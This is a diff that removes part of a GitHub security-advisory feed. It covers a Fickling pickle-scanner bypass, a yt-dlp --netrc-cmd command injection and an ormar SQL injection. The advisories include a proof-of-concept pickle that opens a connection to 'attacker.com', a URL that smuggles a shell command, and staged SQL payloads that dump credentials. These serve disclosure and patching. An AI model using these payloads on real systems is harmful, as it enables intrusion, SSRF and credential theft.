-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9fww-8cpr-q66r</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-02-24T16:03:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[fickling] Fickling has a detection bypass via stdlib network-protocol constructors]]></title>
-        <id>https://github.com/advisories/GHSA-83pf-v6qq-pwmr</id>
-        <link href="https://github.com/advisories/GHSA-83pf-v6qq-pwmr"/>
-        <updated>2026-02-23T22:25:46.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="our-assessment">Our assessment</h1>
-<p><code>imtplib</code>, <code>imaplib</code>, <code>ftplib</code>, <code>poplib</code>, <code>telnetlib</code>, and <code>nntplib</code> were added to the list of unsafe imports (<a href="https://github.com/trailofbits/fickling/commit/6d20564d23acf14b42ec883908aed159be7b9ade">https://github.com/trailofbits/fickling/commit/6d20564d23acf14b42ec883908aed159be7b9ade</a>). The <code>UnusedVariables</code> heuristic works as expected.</p>
-<h1 id="original-report">Original report</h1>
-<h2 id="summary">Summary</h2>
-<p>Fickling's <code>check_safety()</code> API and <code>--check-safety</code> CLI flag incorrectly rate as
-<code>LIKELY_SAFE</code> pickle files that open outbound TCP connections at deserialization time
-using stdlib network-protocol constructors: <code>smtplib.SMTP</code>, <code>imaplib.IMAP4</code>,
-<code>ftplib.FTP</code>, <code>poplib.POP3</code>, <code>telnetlib.Telnet</code>, and <code>nntplib.NNTP</code>.</p>
-<p>The bypass exploits two independent root causes described below.</p>
-<hr>
-<h2 id="root-cause-1-incomplete-blocklist-fixed-in-pr-233">Root Cause 1: Incomplete blocklist (fixed in PR #233)</h2>
-<p><code>fickling/fickle.py</code> (lines 41-97) defines <code>UNSAFE_IMPORTS</code>, the primary blocklist.
-<code>fickling/analysis.py</code> (lines 229-248) defines the parallel
-<code>UnsafeImportsML.UNSAFE_MODULES</code> dict. Both omitted the following stdlib
-network-protocol modules whose constructors open a TCP socket at instantiation time:</p>
-<table>
-<thead>
-<tr>
-<th>Module</th>
-<th>Class</th>
-<th>Default port</th>
-<th>Constructor side-effect</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>smtplib</code></td>
-<td><code>SMTP</code></td>
-<td>25</td>
-<td>TCP connect, reads SMTP banner, sends EHLO</td>
-</tr>
-<tr>
-<td><code>imaplib</code></td>
-<td><code>IMAP4</code></td>
-<td>143</td>
-<td>TCP connect, reads IMAP capability banner</td>
-</tr>
-<tr>
-<td><code>ftplib</code></td>
-<td><code>FTP</code></td>
-<td>21</td>
-<td>TCP connect, reads FTP welcome banner</td>
-</tr>
-<tr>
-<td><code>poplib</code></td>
-<td><code>POP3</code></td>
-<td>110</td>
-<td>TCP connect, reads POP3 greeting</td>
-</tr>
-<tr>
-<td><code>telnetlib</code></td>
-<td><code>Telnet</code></td>
-<td>23</td>
-<td>TCP connect</td>
-</tr>
-<tr>
-<td><code>nntplib</code></td>
-<td><code>NNTP</code></td>
-<td>119</td>
-<td>TCP connect, NNTP handshake</td>
-</tr>
-</tbody></table>
-<p>Because these module names were absent from both blocklists, <code>UnsafeImportsML</code>,
-<code>UnsafeImports</code>, and <code>NonStandardImports</code> all stayed silent. All six are genuine
-stdlib modules so <code>is_std_module()</code> returned <code>True</code> and <code>NonStandardImports</code> did
-not fire.</p>
-<p><strong>Status: patched in PR #233.</strong> The six modules have been added to <code>UNSAFE_IMPORTS</code>.</p>
-<hr>
-<h2 id="root-cause-2-logic-flaw-in-unused_assignments-at-ficklepy1183-unpatched">Root Cause 2: Logic flaw in <code>unused_assignments()</code> at <code>fickle.py:1183</code> (unpatched)</h2>
-<h3 id="description">Description</h3>
-<p><code>unused_assignments()</code> in <code>fickling/fickle.py</code> (lines 1174-1204) identifies variables
-that are assigned but never referenced. <code>UnusedVariables</code> analysis calls this method
-and raises <code>SUSPICIOUS</code> for any unreferenced variable -- this would otherwise catch a
-bare <code>REDUCE</code> opcode that stores its result without using it.</p>
-<p>The flaw is at line 1183. The method iterates over <code>module_body</code> statements and, when
-it encounters the final <code>result = &lt;expr&gt;</code> assignment, breaks out of the loop
-immediately without first walking the right-hand side expression for <code>Name</code> references:</p>
-<pre><code class="language-python"># fickling/fickle.py:1183 (current code -- vulnerable)
-if (
-    len(statement.targets) == 1
-    and isinstance(statement.targets[0], ast.Name)
-    and statement.targets[0].id == "result"
-):
-    # this is the return value of the program
-    break   # exits WITHOUT scanning statement.value
-</code></pre>
-<p>Any variable that appears only in the RHS of <code>result = &lt;expr&gt;</code> is therefore never
-added to the <code>used</code> set and is incorrectly classified as unused.</p>
-<h3 id="how-this-enables-bypass-suppression">How this enables bypass suppression</h3>
-<p>When fickling processes a <code>REDUCE</code> opcode in isolation, it generates:</p>
-<pre><code class="language-python">_var0 = SMTP('attacker.com', 25)
-result = _var0
-</code></pre>
-<p>Because the loop breaks before scanning <code>result = _var0</code>, <code>_var0</code> never enters
-<code>used</code>. <code>UnusedVariables</code> sees <code>_var0</code> as unused and raises <code>SUSPICIOUS</code>.</p>
-<p>Adding a <code>BUILD</code> opcode with an empty dict after the <code>REDUCE</code> changes the generated
-AST to:</p>
-<pre><code class="language-python">from smtplib import SMTP
-_var0 = SMTP('attacker.com', 25)   # dangerous call
-_var1 = _var0                      # BUILD step 1: intermediate reference
-_var1.__setstate__({})             # BUILD step 2: state call
-result = _var1
-</code></pre>
-<p>Now <code>_var0</code> appears on the RHS of <code>_var1 = _var0</code>, a statement processed before the
-break, so <code>_var0</code> correctly enters <code>used</code> and <code>UnusedVariables</code> stays silent.</p>
-<p>The <code>__setstate__</code> call is excluded from <code>OvertlyBadEvals</code> because
-<code>ASTProperties.visit_Call</code> places it in <code>calls</code> but not in <code>non_setstate_calls</code>
-(line 562), and <code>OvertlyBadEvals</code> only iterates <code>non_setstate_calls</code>.</p>
-<p>The <code>SMTP(...)</code> call is skipped by <code>OvertlyBadEvals</code> because <code>_process_import</code> adds
-<code>SMTP</code> to <code>likely_safe_imports</code> for any stdlib module (line 550), and <code>OvertlyBadEvals</code>
-skips calls whose function name is in <code>likely_safe_imports</code> (lines 339-345).</p>
-<p><strong>Net result: zero warnings, severity <code>LIKELY_SAFE</code>.</strong></p>
-<p>This flaw is generic -- it applies to any module not on the blocklist, not just the
-six fixed in PR #233. Any future blocklist gap can be silently exploited using the
-same <code>REDUCE + EMPTY_DICT + BUILD</code> pattern as long as this flaw remains unpatched.</p>
-<h3 id="bypass-opcode-sequence">Bypass opcode sequence</h3>
-<pre><code>Offset  Opcode            Argument
-------  ------            --------
-0       PROTO             4
-2       GLOBAL            'smtplib' 'SMTP'
-16      SHORT_BINUNICODE  'attacker.com'
-30      BININT2           25
-33      TUPLE2
-34      REDUCE                          &lt;- TCP connection opened here
-35      EMPTY_DICT
-36      BUILD                           &lt;- suppresses UnusedVariables via flaw
-37      STOP
-</code></pre>
-<p>Fickling's synthetic AST for this sequence (what all analysis passes inspect):</p>
-<pre><code class="language-python">from smtplib import SMTP
-_var0 = SMTP('attacker.com', 25)
-_var1 = _var0
-_var1.__setstate__({})
-result = _var1
-</code></pre>
-<p>No analysis rule in fickling fires on this AST.</p>
-<h3 id="proof-of-concept">Proof of Concept</h3>
-<p>Requires only <code>pip install fickling</code>. Save as <code>poc.py</code> and run.</p>
-<pre><code class="language-python">import socket
-import threading
-import pickle
-
-def build_bypass_pickle(host: str, port: int) -&gt; bytes:
-    h = host.encode("utf-8")
-    return b"".join([
-        b"\x80\x04",
-        b"csmtplib\nSMTP\n",
-        b"\x8c" + bytes([len(h)]) + h,
-        b"M" + bytes([port &amp; 0xFF, (port &gt;&gt; 8) &amp; 0xFF]),
-        b"\x86",   # TUPLE2
-        b"R",      # REDUCE
-        b"}",      # EMPTY_DICT
-        b"b",      # BUILD
-        b".",      # STOP
-    ])
-
-def run_poc():
-    from fickling.analysis import check_safety
-    from fickling.fickle import Pickled
-
-    HOST, PORT = "127.0.0.1", 19902
-    received = []
-
-    def listener():
-        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        srv.bind((HOST, PORT))
-        srv.listen(1)
-        srv.settimeout(5)
-        try:
-            conn, addr = srv.accept()
-            received.append(addr)
-            conn.close()
-        except socket.timeout:
-            pass
-        srv.close()
-
-    t = threading.Thread(target=listener, daemon=True)
-    t.start()
-
-    raw = build_bypass_pickle(HOST, PORT)
-    loaded = Pickled.load(raw)
-    result = check_safety(loaded)
-
-    print(f"[*] fickling severity : {result.severity.name}")
-    print(f"[*] fickling is_safe  : {result.severity.name == 'LIKELY_SAFE'}")
-
-    assert result.severity.name == "LIKELY_SAFE", "Bypass failed"
-    print("[+] fickling rates the pickle as LIKELY_SAFE  &lt;-- bypass confirmed")
-
-    print("[*] Calling pickle.loads() to simulate victim loading the file...")
-    try:
-        pickle.loads(raw)
-    except Exception:
-        pass
-
-    t.join(timeout=5)
-
-    if received:
-        print(f"[+] Incoming TCP connection received from {received[0]}")
-        print("[+] FULL BYPASS CONFIRMED: outbound connection made while fickling reported LIKELY_SAFE")
-    else:
-        print("[-] No TCP connection received (network blocked)")
-        print("    fickling still rated LIKELY_SAFE -- static analysis bypass confirmed regardless")
-
-if __name__ == "__main__":
-    run_poc()
-</code></pre>
-<h3 id="expected-output">Expected output</h3>
-<pre><code>[*] fickling severity : LIKELY_SAFE
-[*] fickling is_safe  : True
-[+] fickling rates the pickle as LIKELY_SAFE  &lt;-- bypass confirmed
-[*] Calling pickle.loads() to simulate victim loading the file...
-[+] Incoming TCP connection received from ('127.0.0.1', 58412)
-[+] FULL BYPASS CONFIRMED: outbound connection made while fickling reported LIKELY_SAFE
-</code></pre>
-<p>Tested on Python 3.11.1, Windows. Not OS-specific.</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker distributing a malicious pickle file (e.g. a crafted ML model checkpoint)
-can silently:</p>
-<ul>
-<li><strong>Enumerate victims</strong> -- receive a TCP callback every time the pickle is loaded,
-including in sandboxed environments</li>
-<li><strong>Exfiltrate host identity</strong> -- victim IP, hostname (via SMTP EHLO), and service
-banners are sent to the attacker's server</li>
-<li><strong>Probe internal services (SSRF)</strong> -- if the victim host can reach internal SMTP
-relays, IMAP stores, or FTP servers, the pickle probes those services on the
-attacker's behalf</li>
-<li><strong>Establish a covert channel</strong> -- protocol handshakes carry attacker-controlled
-bytes through a channel fickling explicitly labels safe</li>
-</ul>
-<p>The <code>is_likely_safe()</code> helper (<code>fickling/analysis.py:468-474</code>) and the <code>--check-safety</code>
-CLI flag both gate on <code>severity == LIKELY_SAFE</code>. This bypass clears that gate
-completely with zero warnings.</p>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>Walk <code>statement.value</code> before the <code>break</code> so variables referenced only in the result
-assignment are correctly counted as used:</p>
-<pre><code class="language-python"># fickling/fickle.py:1183 -- suggested fix
-if (
-    len(statement.targets) == 1
-    and isinstance(statement.targets[0], ast.Name)
-    and statement.targets[0].id == "result"
-):
-    # scan RHS before breaking so variables used only here are marked as used
-    for node in ast.walk(statement.value):
-        if isinstance(node, ast.Name):
-            used.add(node.id)
-    break
-</code></pre>
-<p>This is the same pattern already used for every other statement in the loop
-(lines 1200-1203). All 55 non-torch tests pass with this fix applied.</p>
-<hr>
-<h2 id="affected-versions">Affected versions</h2>
-<p>All releases including <code>v0.1.7</code> (latest). Confirmed on latest <code>master</code> as of
-2026-02-19. Root cause 1 patched in PR #233 (master only, not yet released).
-Root cause 2 unpatched as of this report.</p>
-<h2 id="reporter">Reporter</h2>
-<p>Anmol Vats</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/trailofbits/fickling/security/advisories/GHSA-83pf-v6qq-pwmr">https://github.com/trailofbits/fickling/security/advisories/GHSA-83pf-v6qq-pwmr</a></li>
-<li><a href="https://github.com/trailofbits/fickling/pull/233">https://github.com/trailofbits/fickling/pull/233</a></li>
-<li><a href="https://github.com/trailofbits/fickling/commit/6d20564d23acf14b42ec883908aed159be7b9ade">https://github.com/trailofbits/fickling/commit/6d20564d23acf14b42ec883908aed159be7b9ade</a></li>
-<li><a href="https://github.com/advisories/GHSA-83pf-v6qq-pwmr">https://github.com/advisories/GHSA-83pf-v6qq-pwmr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-83pf-v6qq-pwmr</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-02-20T18:24:46.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[yt-dlp] yt-dlp: Arbitrary Command Injection when using the `--netrc-cmd` option]]></title>
-        <id>https://github.com/advisories/GHSA-g3gw-q23r-pgqm</id>
-        <link href="https://github.com/advisories/GHSA-g3gw-q23r-pgqm"/>
-        <updated>2026-02-24T16:08:36.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>When yt-dlp's <code>--netrc-cmd</code> command-line option (or <code>netrc_cmd</code> Python API parameter) is used, an attacker could achieve arbitrary command injection on the user's system with a maliciously crafted URL.</p>
-<h3 id="impact">Impact</h3>
-<p>yt-dlp maintainers assume the impact of this vulnerability to be high for anyone who uses <code>--netrc-cmd</code> in their command/configuration or <code>netrc_cmd</code> in their Python scripts. Even though the maliciously crafted URL itself will look very suspicious to many users, it would be trivial for a maliciously crafted webpage with an inconspicuous URL to covertly exploit this vulnerability via HTTP redirect. Users without <code>--netrc-cmd</code> in their arguments or <code>netrc_cmd</code> in their scripts are unaffected. No evidence has been found of this exploit being used in the wild.</p>
-<h3 id="patches">Patches</h3>
-<p>yt-dlp version 2026.02.21 fixes this issue by validating all netrc "machine" values and raising an error upon unexpected input.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>It is recommended to upgrade yt-dlp to version 2026.02.21 as soon as possible.</p>
-<p>Users who are unable to upgrade should avoid using the <code>--netrc-cmd</code> command-line option (or <code>netrc_cmd</code> Python API parameter), or they should at least not pass a placeholder (<code>{}</code>) in their <code>--netrc-cmd</code> argument.</p>
-<h3 id="details">Details</h3>
-<p>yt-dlp's <code>--netrc-cmd</code> option can be used to run any arbitrary shell command to retrieve site login credentials so that the user doesn't have to store the credentials as plaintext in the filesystem. The <code>--netrc-cmd</code> argument is a shell command with an optional placeholder (<code>{}</code>). If the placeholder is present in the argument, it is replaced with the netrc "machine" value, which specifies the site for which login credentials are needed.</p>
-<p>The netrc "machine" value is usually explicitly defined in yt-dlp's extractor code for a given site. However, yt-dlp has four extractors where the netrc "machine" value needs to be dynamically sourced from the site's hostname. And in three of those extractors (<code>GetCourseRuIE</code>, <code>TeachableIE</code> and <code>TeachableCourseIE</code>), wildcard matches are allowed for one or more subdomains of the hostname. This can result in a netrc "machine" value that contains special shell characters.</p>
-<p>The <code>--netrc-cmd</code> argument is executed by a modified version of Python's <code>subprocess.Popen</code> with <code>shell=True</code>, which means that any special characters may be interpreted by the host shell, potentially leading to arbitrary command injection.</p>
-<p>Here is an example of maliciously crafted URL input that exploits the vulnerability:</p>
-<pre><code class="language-cmd">&gt; yt-dlp --netrc-cmd "echo {}" "https://;echo pwned&gt;&amp;2;#.getcourse.ru/video"
-[GetCourseRu] Executing command: echo getcourseru
-WARNING: [GetCourseRu] Failed to parse .netrc: bad toplevel token 'getcourseru' (-, line 2)
-[GetCourseRu] Extracting URL: https://;echo pwned&gt;&amp;2;#.getcourse.ru/video
-[GetCourseRu] Executing command: echo ;echo pwned&gt;&amp;2;
-pwned
-[GetCourseRu] No authenticators for ;echo pwned&gt;&amp;2;
-[GetCourseRu] video: Downloading webpage
-</code></pre>
-<p>Although only 3 of yt-dlp's extractors are directly susceptible to this attack, yt-dlp's "generic" extractor will follow HTTP redirects and try to match the resulting URL with one of the dedicated extractors. This means that any URL processed by the generic extractor could ultimately lead to a maliciously crafted URL that is matched by one of the vulnerable extractors. Hypothetically, an attacker could create a website with an inconspicuous URL and legitimate-looking media content that would serve an HTTP redirect to a maliciously crafted URL when it detects a request from yt-dlp.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-g3gw-q23r-pgqm">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-g3gw-q23r-pgqm</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26331">https://nvd.nist.gov/vuln/detail/CVE-2026-26331</a></li>
-<li><a href="https://github.com/yt-dlp/yt-dlp/releases/tag/2026.02.21">https://github.com/yt-dlp/yt-dlp/releases/tag/2026.02.21</a></li>
-<li><a href="https://github.com/yt-dlp/yt-dlp/commit/1fbbe29b99dc61375bf6d786f824d9fcf6ea9c1a">https://github.com/yt-dlp/yt-dlp/commit/1fbbe29b99dc61375bf6d786f824d9fcf6ea9c1a</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-g3gw-q23r-pgqm">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-g3gw-q23r-pgqm</a></li>
-<li><a href="https://github.com/yt-dlp/yt-dlp/commit/1fbbe29b99dc61375bf6d786f824d9fcf6ea9c1a">https://github.com/yt-dlp/yt-dlp/commit/1fbbe29b99dc61375bf6d786f824d9fcf6ea9c1a</a></li>
-<li><a href="https://github.com/yt-dlp/yt-dlp/releases/tag/2026.02.21">https://github.com/yt-dlp/yt-dlp/releases/tag/2026.02.21</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26331">https://nvd.nist.gov/vuln/detail/CVE-2026-26331</a></li>
-<li><a href="https://github.com/advisories/GHSA-g3gw-q23r-pgqm">https://github.com/advisories/GHSA-g3gw-q23r-pgqm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g3gw-q23r-pgqm</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-02-23T22:13:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[ormar] ormar is vulnerable to SQL Injection through aggregate functions min() and max()]]></title>
-        <id>https://github.com/advisories/GHSA-xxh2-68g9-8jqr</id>
-        <link href="https://github.com/advisories/GHSA-xxh2-68g9-8jqr"/>
-        <updated>2026-02-24T16:08:29.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="report-of-sql-injection-vulnerability-in-ormar-orm">Report of SQL Injection Vulnerability in Ormar ORM</h1>
-<h2 id="a-sql-injection-attack-can-be-achieved-by-passing-a-crafted-string-to-the-min-or-max-aggregate-functions">A SQL Injection attack can be achieved by passing a crafted string to the min() or max() aggregate functions.</h2>
-<h2 id="brief-description">Brief description</h2>
-<p>When performing aggregate queries, Ormar ORM constructs SQL expressions by passing user-supplied column names directly into <code>sqlalchemy.text()</code> without any validation or sanitization. The <code>min()</code> and <code>max()</code> methods in the <code>QuerySet</code> class accept arbitrary string input as the column parameter. While <code>sum()</code> and <code>avg()</code> are partially protected by an <code>is_numeric</code> type check that rejects non-existent fields, <code>min()</code> and <code>max()</code> skip this validation entirely. As a result, an attacker-controlled string is embedded as raw SQL inside the aggregate function call. Any unauthorized user can exploit this vulnerability to read the entire database contents, including tables unrelated to the queried model, by injecting a subquery as the column parameter.</p>
-<h2 id="affected-versions">Affected versions</h2>
-<pre><code>0.9.9 - 0.12.2
-0.20.0b1 - 0.22.0 (latest)
-</code></pre>
-<p>The vulnerable <code>SelectAction.get_text_clause()</code> method and the <code>min()</code>/<code>max()</code> aggregate functions were introduced together in commit <code>ff9d412</code> (March 12, 2021) and first released in version <strong>0.9.9</strong>. The vulnerable code has never been modified since — <code>get_text_clause()</code> is identical in every subsequent version through the latest <strong>0.21.0</strong>.</p>
-<p>Versions prior to 0.9.9 do not contain the <code>min()</code>/<code>max()</code> aggregate feature and are not affected.</p>
-<p>The following uses the latest ormar 0.21.0 as an example to illustrate the attack.</p>
-<h2 id="vulnerability-details">Vulnerability details</h2>
-<p>When performing an aggregate query, the <code>QuerySet.max()</code> method (line 721, <code>queryset.py</code>) passes user input to <code>_query_aggr_function()</code>. This method creates a <code>SelectAction</code> object for each column name. The column string is split by <code>__</code> and the last part becomes <code>self.field_name</code> — with no validation against the model's actual fields.</p>
-<p>The critical vulnerability is in <code>SelectAction.get_text_clause()</code> (line 41-43, <code>select_action.py</code>), which directly passes <code>self.field_name</code> into <code>sqlalchemy.text()</code>:</p>
-<pre><code class="language-python">#select_action.py line 41-43
-def get_text_clause(self) -&gt; sqlalchemy.sql.expression.TextClause:
-    alias = f"{self.table_prefix}_" if self.table_prefix else ""
-    return sqlalchemy.text(f"{alias}{self.field_name}")  # unsanitised user input!
-</code></pre>
-<p>The <code>apply_func()</code> method then wraps this raw text clause inside <code>func.max()</code>, producing SQL like <code>max(&lt;attacker_input&gt;)</code>. Since <code>sqlalchemy.text()</code> treats its argument as literal SQL, any subquery or SQL expression injected through the column name will be executed by the database engine.</p>
-<p>The <code>_query_aggr_function()</code> method (line 704-719, <code>queryset.py</code>) only validates field types for <code>sum</code> and <code>avg</code>, leaving <code>min</code> and <code>max</code> completely unprotected:</p>
-<pre><code class="language-python">#queryset.py line 704-719
-async def _query_aggr_function(self, func_name: str, columns: List) -&gt; Any:
-    func = getattr(sqlalchemy.func, func_name)
-    select_actions = [
-        SelectAction(select_str=column, model_cls=self.model) for column in columns
-    ]
-    if func_name in ["sum", "avg"]:          # &lt;-- only sum/avg are checked!
-        if any(not x.is_numeric for x in select_actions):
-            raise QueryDefinitionError(...)
-    select_columns = [x.apply_func(func, use_label=True) for x in select_actions]
-    expr = self.build_select_expression().alias(f"subquery_for_{func_name}")
-    expr = sqlalchemy.select(*select_columns).select_from(expr)
-    result = await self.database.fetch_one(expr)
-    return dict(result) if len(result) &gt; 1 else result[0]
-</code></pre>
-<p>To reproduce the attack, you can follow the steps below, using a FastAPI application with SQLite as an example.</p>
-<p>Note: The PoC consists of two files provided in the attachments — <code>poc_server.py</code> (the vulnerable server) and <code>poc_attacker.py</code> (the HTTP-based attacker script).</p>
-<h2>Start the vulnerable application</h2>
-<ol>
-<li>Install dependencies:</li>
-</ol>
-<pre><code class="language-bash">pip install ormar databases aiosqlite fastapi uvicorn httpx
-</code></pre>
-<ol>
-<li>The vulnerable server (<code>poc_server.py</code>) is based on the <strong>official ormar FastAPI example</strong> (<a href="https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py">ormar/examples/fastapi_quick_start.py</a>). The only modification is the addition of a <code>/items/stats</code> endpoint — a common pattern for applications that provide aggregate statistics. This demonstrates that the vulnerability is easily triggered by natural API design.</li>
-</ol>
-<p>The server defines three models:</p>
-<ul>
-<li><code>Category</code> and <code>Item</code> — from the official ormar example (unchanged)</li>
-<li><code>AdminUser</code> — simulates internal data (e.g., an admin_users table) that should NOT be accessible through the public API</li>
-</ul>
-<p>The vulnerable endpoint:</p>
-<pre><code class="language-python"># Added endpoint: aggregate statistics (VULNERABLE)
-# This is a common and natural pattern — letting users request
-# statistics on different columns. The ormar documentation itself
-# shows: await Book.objects.max(columns=["year"])
-# See: &lt;https://collerek.github.io/ormar/queries/aggregations/&gt;
-
-</code><p><code class="language-python">@app.get("/items/stats")
-async def item_stats(
-    metric: str = Query("max", description="max or min"),
-    column: str = Query("price", description="Column to aggregate"),
-):
-    """Return aggregate statistics for items."""
-    if metric == "max":
-        result = await Item.objects.max(column)
-    elif metric == "min":
-        result = await Item.objects.min(column)
-    else:
-        return {"error": "Unsupported metric"}
-    return {"metric": metric, "column": column, "result": result}
-</code></p></pre><p></p>
-<p>The database contains:</p>
-
-<table>
-<thead>
-<tr>
-<th>Table</th>
-<th>Data</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>categories</td>
-<td>Electronics</td>
-</tr>
-<tr>
-<td>items</td>
-<td>Laptop ($999.99), Phone ($699.99), Tablet ($449.99), Monitor ($329.99)</td>
-</tr>
-<tr>
-<td>admin_users</td>
-<td>root / Sup3r$ecretP@ss! / ak-9f8e7d6c5b4a3210-prod</td>
-</tr>
-<tr>
-<td>deploy-bot / ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi / ak-1a2b3c4d5e6f7890-ci</td>
-<td></td>
-</tr>
-</tbody></table>
-<p>The <code>admin_users</code> table is <strong>NOT</strong> exposed via any API endpoint.</p>
-<h2>The attack steps</h2>
-<p>The PoC requires two terminals:</p>
-<p><strong>Terminal 1</strong> — Start the vulnerable server:</p>
-<pre><code class="language-bash">python poc_server.py
-</code></pre>
-<p><strong>Terminal 2</strong> — Run the attacker script:</p>
-<pre><code class="language-bash">python poc_attacker.py
-</code></pre>
-<p>The attacker script (<code>poc_attacker.py</code>) sends HTTP requests to the running server. It has <strong>NO prior knowledge</strong> of the database schema — all information is discovered through the injection. The attacker executes 6 progressive attack stages through the single <code>/items/stats</code> endpoint.</p>
-<h2>Principle of vulnerability exploitation</h2>
-<h3>1. The attacker confirms injection by sending an arithmetic expression</h3>
-<p>The attacker sends <code>GET /items/stats?metric=max&amp;column=1+1</code>. The data flow is:</p>
-<pre><code>HTTP request: GET /items/stats?metric=max&amp;column=1+1
-    ↓
-item_stats(metric="max", column="1+1")                # poc_server.py
-    ↓
-Item.objects.max("1+1")                                # queryset.py:721
-    ↓
-_query_aggr_function(func_name="max", columns=["1+1"]) # queryset.py:704
-    ↓
-SelectAction(select_str="1+1", model_cls=Item)          # select_action.py:22
-    ↓
-_split_value_into_parts("1+1")  →  self.field_name = "1+1"
-    ↓
-# min/max skip the is_numeric check (line 709 only checks sum/avg)
-    ↓
-get_text_clause()  →  sqlalchemy.text("1+1")            # select_action.py:43
-    ↓
-apply_func(sqlalchemy.func.max)  →  max(1+1)
-</code></pre>
-<p>Generated SQL:</p>
-<pre><code class="language-sql">SELECT max(1+1) AS "1+1"
-FROM (SELECT items.id AS id, items.name AS name, items.price AS price,
-             items.category AS category
-      FROM items) AS subquery_for_max
-</code></pre>
-<p>The API returns <code>{"metric":"max","column":"1+1","result":2}</code>, confirming that the arithmetic expression was evaluated as SQL.</p>
-<h3>2. The attacker enumerates database tables</h3>
-<p>The attacker injects a subquery to read <code>sqlite_master</code>:</p>
-<pre><code>GET /items/stats?metric=max&amp;column=(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')
-</code></pre>
-<p>Which internally calls:</p>
-<pre><code class="language-python">await Item.objects.max(
-    "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')"
-)
-</code></pre>
-<p>Generated SQL:</p>
-<pre><code class="language-sql">SELECT max((SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'))
-       AS "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')"
-FROM (SELECT items.id, items.name, items.price, items.category
-      FROM items) AS subquery_for_max
-</code></pre>
-<p>The API returns <code>categories,admin_users,items</code>, revealing the hidden <code>admin_users</code> table.</p>
-<h3>3. The attacker extracts the schema of the target table</h3>
-<pre><code>GET /items/stats?metric=max&amp;column=(SELECT sql FROM sqlite_master WHERE name='admin_users')
-</code></pre>
-<p>The API returns the full <code>CREATE TABLE</code> statement, revealing column names: <code>username</code>, <code>password</code>, <code>api_key</code>.</p>
-<h3>4. The attacker dumps all credentials in a single query</h3>
-<pre><code>GET /items/stats?metric=max&amp;column=(SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10)) FROM admin_users)
-</code></pre>
-<p>Generated SQL:</p>
-<pre><code class="language-sql">SELECT max((SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10))
-            FROM admin_users))
-       AS "..."
-FROM (SELECT items.id, items.name, items.price, items.category
-      FROM items) AS subquery_for_max
-</code></pre>
-<p>The API returns all credentials:</p>
-<pre><code>root | Sup3r$ecretP@ss! | ak-9f8e7d6c5b4a3210-prod
-deploy-bot | ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi | ak-1a2b3c4d5e6f7890-ci
-</code></pre>
-<h3>5. Blind boolean-based extraction (when results are not directly visible)</h3>
-<p>Even if the API does not return query results directly, the attacker can use boolean-based blind injection to extract data character by character using binary search:</p>
-<pre><code>GET /items/stats?metric=max&amp;column=CASE WHEN UNICODE(SUBSTR((SELECT password FROM admin_users WHERE username='root'),1,1))&gt;83 THEN 1 ELSE 0 END
-</code></pre>
-<p>Which internally calls:</p>
-<pre><code class="language-python"># "Is the Nth character of root's password greater than ASCII code M?"
-await Item.objects.max(
-    "CASE WHEN UNICODE(SUBSTR("
-    "(SELECT password FROM admin_users WHERE username='root'),1,1))&gt;83 "
-    "THEN 1 ELSE 0 END"
-)
-# Returns 0 → first character is 'S' (ASCII 83)
-</code></pre>
-<p>By iterating over each position with binary search, the full password <code>Sup3r$ecretP@ss!</code> is extracted in approximately 113 HTTP requests (16 characters x ~7 binary search steps).</p>
-<h3>6. The attacker extracts the production API key</h3>
-<pre><code>GET /items/stats?metric=max&amp;column=(SELECT api_key FROM admin_users WHERE username='root')
-</code></pre>
-<p>The API returns: <code>ak-9f8e7d6c5b4a3210-prod</code></p>
-<p>All data was extracted through a single public API endpoint using only unauthenticated GET requests.</p>
-## Start the vulnerable application
-
-<ol>
-<li>Install dependencies:</li>
-</ol>
-<pre><code class="language-bash">pip install ormar databases aiosqlite fastapi uvicorn httpx
-</code></pre>
-<ol>
